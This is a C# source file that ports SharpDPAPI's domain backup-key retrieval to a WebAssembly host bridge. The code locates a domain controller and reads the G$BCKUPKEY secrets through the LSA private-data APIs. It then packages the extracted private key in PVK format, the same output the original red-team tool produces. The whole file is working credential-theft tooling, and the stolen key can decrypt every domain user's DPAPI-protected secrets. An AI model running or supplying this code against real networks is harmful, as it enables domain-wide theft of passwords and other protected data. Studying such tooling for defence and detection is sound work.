// WfDpapiBackupkey.cs — domain DPAPI backup-key retrieval via the host bridge.
//
// SharpDPAPI's Backup.GetBackupKey runs this chain on Windows:
//
//   Interop.GetDCName()                                         (DsGetDcNameW)
//   LsaOpenPolicy(\\<dc>, POLICY_GET_PRIVATE_INFORMATION)
//   LsaRetrievePrivateData(handle, "G$BCKUPKEY_PREFERRED")     → 16-byte GUID
//   LsaRetrievePrivateData(handle, "G$BCKUPKEY_<GUID>")         → key blob
//   LsaClose(handle)
//
// Both LSA APIs write a host-allocated LSA_UNICODE_STRING* into an OUT
// parameter; their Buffer field is also a host pointer. wasm32 C# would
// truncate both via Marshal.PtrToStructure on a 32-bit IntPtr → OOB trap.
// The host bridge `dpapi_bkey` runs the entire chain on the host and returns
// only the materialised byte payloads, then this helper formats the kirbi
// (PVK header + base64) exactly the way native SharpDPAPI does.
//
// PVK wrapping (matches native lines 75-88 of lib/Backup.cs):
//   The raw key blob is shaped: [version u32][keyLen u32][certLen u32][key bytes][cert bytes].
//   PVK output buffer length = keyLen + 24. The first 24 bytes are a PVK
//   header: magic 0xB0B5F11E little-endian at offset 0, "1" at offset 8,
//   keyLen little-endian at offset 20. The key bytes follow starting at
//   offset 24. We don't emit the cert.

using System;
using System.Runtime.InteropServices;

namespace WasmForge.Helpers
{
    public static unsafe class WfDpapiBackupkey
    {
        [DllImport("env", EntryPoint = "dpapi_bkey")]
        private static extern uint NativeDpapiBackupkey(
            uint serverPtr, uint serverLen,
            uint outBufPtr, uint outBufCap);

        public struct Result
        {
            public bool Ok;
            public uint Status;       // 0 on success; otherwise Win32 / NTSTATUS code from host
            public string DcName;     // FQDN of the discovered (or supplied) DC
            public byte[] GuidBytes;  // raw 16 bytes
            public string GuidString; // hyphenated form
            public string KeyName;    // "G$BCKUPKEY_<GUID>"
            public byte[] KeyBlob;    // raw bytes (version/keyLen/certLen + payload)
            public byte[] KeyPvk;     // PVK-wrapped key ready for base64
        }

        /// <summary>
        /// Run the full DsGetDcName + LSA chain via the host bridge. When
        /// <paramref name="server"/> is null or empty, the host calls
        /// DsGetDcNameW to find the current domain controller.
        /// </summary>
        public static Result Retrieve(string server)
        {
            var res = new Result();

            byte[] serverBytes = string.IsNullOrEmpty(server)
                ? Array.Empty<byte>()
                : System.Text.Encoding.UTF8.GetBytes(server);

            const int outCap = 256 * 1024; // generous — keys are typically ~1 KiB
            byte[] outBuf = new byte[outCap];

            uint written;
            fixed (byte* sp = serverBytes.Length > 0 ? serverBytes : new byte[1])
            fixed (byte* op = outBuf)
            {
                uint spArg = serverBytes.Length > 0 ? (uint)(IntPtr)sp : 0;
                written = NativeDpapiBackupkey(spArg, (uint)serverBytes.Length,
                    (uint)(IntPtr)op, (uint)outBuf.Length);
            }
            if (written < 16)  // minimum: status(4) + 3 × empty length(4)
                return res;

            int off = 0;
            res.Status = BitConverter.ToUInt32(outBuf, off); off += 4;

            int dcLen = (int)BitConverter.ToUInt32(outBuf, off); off += 4;
            if (off + dcLen > (int)written) return res;
            res.DcName = dcLen > 0 ? System.Text.Encoding.UTF8.GetString(outBuf, off, dcLen) : "";
            off += dcLen;

            int guidLen = (int)BitConverter.ToUInt32(outBuf, off); off += 4;
            if (off + guidLen > (int)written) return res;
            if (guidLen == 16)
            {
                res.GuidBytes = new byte[16];
                Array.Copy(outBuf, off, res.GuidBytes, 0, 16);
                res.GuidString = new Guid(res.GuidBytes).ToString();
                res.KeyName = "G$BCKUPKEY_" + res.GuidString;
            }
            off += guidLen;

            int blobLen = (int)BitConverter.ToUInt32(outBuf, off); off += 4;
            if (off + blobLen > (int)written) return res;
            if (blobLen > 0)
            {
                res.KeyBlob = new byte[blobLen];
                Array.Copy(outBuf, off, res.KeyBlob, 0, blobLen);
                res.KeyPvk = BuildPvk(res.KeyBlob);
            }
            off += blobLen;

            res.Ok = res.Status == 0 && !string.IsNullOrEmpty(res.DcName)
                && res.GuidBytes != null && res.KeyPvk != null;
            return res;
        }

        /// <summary>
        /// Wrap the raw LSA blob in PVK format matching SharpDPAPI's
        /// Backup.GetBackupKey lines 75-88. Returns null on a malformed blob.
        /// </summary>
        public static byte[] BuildPvk(byte[] blob)
        {
            if (blob == null || blob.Length < 12) return null;
            int keyLen = BitConverter.ToInt32(blob, 4);
            if (keyLen <= 0 || keyLen + 12 > blob.Length) return null;

            byte[] pvk = new byte[keyLen + 24];
            // Magic: PVK_MAGIC = 0xB0B5F11E, stored little-endian as bytes
            // [1E F1 B5 B0]. (Matches Microsoft's PVKHeader.PrivateKeyMagic.)
            pvk[0] = 0x1E;
            pvk[1] = 0xF1;
            pvk[2] = 0xB5;
            pvk[3] = 0xB0;
            // PvkKeyType marker.
            pvk[8] = 1;
            // KeyLen at offset 20 (little-endian uint).
            byte[] lenBytes = BitConverter.GetBytes((uint)keyLen);
            Array.Copy(lenBytes, 0, pvk, 20, 4);
            // Key bytes start at offset 12 in the raw blob, written at PVK offset 24.
            Array.Copy(blob, 12, pvk, 24, keyLen);
            return pvk;
        }
    }
}
